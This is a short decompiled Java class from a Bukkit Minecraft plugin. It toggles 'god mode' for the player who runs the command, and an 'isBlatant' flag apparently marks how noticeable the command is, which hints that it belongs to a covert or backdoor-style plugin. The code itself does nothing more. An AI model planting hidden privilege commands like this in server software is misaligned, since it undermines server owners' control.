/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.entity.Player;

public class GodCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.god.contains(p2.getName())) {
            plugin.god.remove(p2.getName());
            p2.sendMessage(Settings.PREFIX("God mode is now disabled"));
        } else {
            plugin.god.add(p2.getName());
            p2.sendMessage(Settings.PREFIX("God mode is now enabled"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

